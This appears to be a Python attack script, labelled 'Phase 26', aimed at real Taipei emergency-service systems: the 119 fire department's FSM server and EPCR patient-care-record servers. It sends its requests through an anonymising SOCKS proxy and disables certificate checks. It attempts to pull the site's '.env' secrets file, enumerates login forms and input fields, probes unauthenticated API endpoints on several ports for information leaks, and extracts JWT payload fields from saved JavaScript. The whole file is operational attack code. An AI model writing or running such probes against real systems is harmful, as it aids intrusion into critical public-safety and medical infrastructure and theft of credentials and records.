#!/usr/bin/env python3
"""Phase 26: Extract JWT payload structure + FSM .env + EPCR error responses."""
import requests, urllib3, re, json, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*'}

# 1. Get EPCR JWT payload structure from authInterceptor
print("=== EPCR JWT Payload Structure ===")
jwt_path = '/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/login_pages/epcr_js_authInterceptorConfig_config_js.js'
with open(jwt_path, 'r', errors='replace') as f:
    interceptor = f.read()

# Find jwtOptions config
for m in re.finditer(r'jwtOptions.*?(getConfig|tokenGetter)', interceptor, re.DOTALL):
    print(f"  JWT config found: {m.group(0)[:200]}")

# Find what fields are in the token payload (from AuthService)
as_path = '/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/login_pages/epcr_js_AuthService_js.js'
with open(as_path, 'r', errors='replace') as f:
    auth_svc = f.read()

# Find token payload access patterns
for m in re.finditer(r'payload\.\w+', auth_svc):
    print(f"  Token payload field: {m.group(0)}")
for m in re.finditer(r'tokenPayload\.\w+', auth_svc):
    print(f"  Token payload field: {m.group(0)}")
for m in re.finditer(r'response\.data\.(\w+)', auth_svc):
    print(f"  Auth response field: {m.group(1)}")

# 2. Try to extract FSM .env (via proxy)
print("\n=== FSM .env extraction ===")
try:
    r = requests.get('https://fsm.119.gov.taipei/.env', proxies=PROXY, headers=HEADERS, verify=False, timeout=20)
    print(f"Status: {r.status_code}, len={len(r.text)}")
    # Check if it's actually env content (not HTML)
    if r.status_code == 200 and not '<html' in r.text.lower()[:100]:
        print("Real .env content:")
        print(r.text[:500])
    else:
        print("Not a real .env (HTML page):")
        print(r.text[:300])
except Exception as e:
    print(f"Error: {e}")

# 3. Try FSM login page
print("\n=== FSM login page ===")
try:
    r = requests.get('https://fsm.119.gov.taipei/w/fsm119/index', proxies=PROXY, headers=HEADERS, verify=False, timeout=20)
    print(f"Status: {r.status_code}, len={len(r.text)}")
    title = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I)
    if title:
        print(f"Title: {title.group(1).strip()}")
    # Find form
    form = re.search(r'<form[^>]*>(.*?)</form>', r.text, re.I | re.DOTALL)
    if form:
        print(f"Has form: Yes")
        inputs = re.findall(r'<input[^>]+name="([^"]+)"', form.group(0))
        print(f"Input fields: {inputs}")
    else:
        print("Has form: No (checking for any input)")
        inputs = re.findall(r'<input[^>]+name="([^"]+)"', r.text)
        print(f"All inputs: {inputs[:10]}")
except Exception as e:
    print(f"Error: {e}")

# 4. EPCR API endpoint probing without auth (find info-disclosure)
print("\n=== EPCR API 401/403 response analysis ===")
for port in [4004, 4003]:
    for path in ['/login', '/ssoLogin', '/sso/login', '/auth/login', '/api/login', '/captcha', '/users', '/health']:
        try:
            url = f'https://epcr.tpf.gov.tw:{port}{path}'
            r = requests.get(url, proxies=PROXY, headers=HEADERS, verify=False, timeout=15)
            ct = r.headers.get('Content-Type', 'N/A')
            body = r.text[:100] if r.text else ''
            print(f"  :{port}{path} -> {r.status_code} [{ct}] {body}")
        except Exception as e:
            print(f"  :{port}{path} -> ERR: {str(e)[:80]}")

# 5. Check EPCR Hospital Server (port 4002) login
print("\n=== EPCR Hospital Server (4002) login ===")
try:
    r = requests.get('https://epcr.tpf.gov.tw:4002/', headers=HEADERS, verify=False, timeout=15)
    print(f"Status: {r.status_code}, len={len(r.text)}")
    title = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I)
    if title:
        print(f"Title: {title.group(1).strip()}")
    # Find login form
    for m in re.finditer(r'<form[^>]*>', r.text, re.I):
        print(f"  Form: {m.group(0)[:200]}")
    for m in re.finditer(r'<input[^>]+name="([^"]+)"[^>]*type="([^"]+)"', r.text, re.I):
        print(f"  Input: {m.group(1)} (type={m.group(2)})")
    # Find auth-related URLs
    for m in re.finditer(r'authServer["\s:]+["\']([^"\']+)["\']', r.text):
        print(f"  authServer: {m.group(1)}")
except Exception as e:
    print(f"Error: {e}")
